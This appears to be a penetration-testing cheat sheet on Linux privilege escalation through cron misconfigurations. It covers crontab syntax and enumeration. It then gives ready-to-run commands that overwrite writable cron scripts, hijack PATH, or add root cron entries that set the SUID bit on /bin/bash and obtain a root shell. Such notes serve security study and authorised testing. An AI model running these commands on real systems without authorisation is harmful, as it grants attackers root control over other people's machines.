# Crontab Misconfigurations

## Table of Contents

1. [Overview](#overview)
2. [Crontab Syntax](#crontab-syntax)
3. [Enumeration](#enumeration)
4. [Privilege Escalation](#privilege-escalation)

---

## Overview

Cron is a daemon that executes scheduled commands. System-wide cron jobs (`/etc/crontab`) run as the specified user (often root). If a cron job is misconfigured, we can hijack its execution to escalate privileges.

## Crontab Syntax

```
* * * * * <command>
- - - - -
| | | | |
| | | | ----- Weekday (0 - 7) (Sunday is 0 or 7)
| | | ------- Month (1 - 12)
| | --------- Day (1 - 31)
| ----------- Hour (0 - 23)
------------- Minute (0 - 59)
```

In system-wide crontabs (`/etc/crontab`, `/etc/cron.d/`), a user field is added:

```
* * * * * root /path/to/script.sh
```

## Enumeration

```bash
# Current user's crontab
crontab -l

# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Check permissions on scripts called by cron
grep -v '^#' /etc/crontab | grep -v '^$' | awk '{print $NF}' | xargs ls -la 2>/dev/null

# Monitor cron activity in real time (if no crontab is readable)
# Uses pspy — https://github.com/DominicBreuker/pspy
./pspy64
```

## Privilege Escalation

### 1. Writable script

If a cron job runs a script that is world-writable:

```bash
# Identify the script
cat /etc/crontab
# * * * * * root /opt/backup.sh

# Check permissions
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root ... /opt/backup.sh  ← world-writable

# Overwrite with payload
echo 'chmod +s /bin/bash' > /opt/backup.sh

# Wait for cron to execute, then
/bin/bash -p
```

### 2. PATH hijacking in cron

If the crontab defines a `PATH` and a job calls a command without absolute path:

```bash
# /etc/crontab contains:
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# * * * * * root backup

# If /home/user is writable and comes first in PATH:
echo '#!/bin/bash
chmod +s /bin/bash' > /home/user/backup
chmod +x /home/user/backup
```

See [PATH Hijacking](../hijacking/path-hijacking.md) for details.

### 3. Wildcard injection

If a cron job uses wildcards (e.g., `tar cf /backup/archive.tar *`), filenames can be crafted to inject flags.

See [Wildcard Injection](../hijacking/wildcard-injection.md) for details.

### 4. Writable cron directory

If `/etc/cron.d/` or other cron directories are writable, drop a new cron file:

```bash
echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/privesc
```

### 5. Overwrite crontab itself

If `/etc/crontab` is writable:

```bash
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab
```
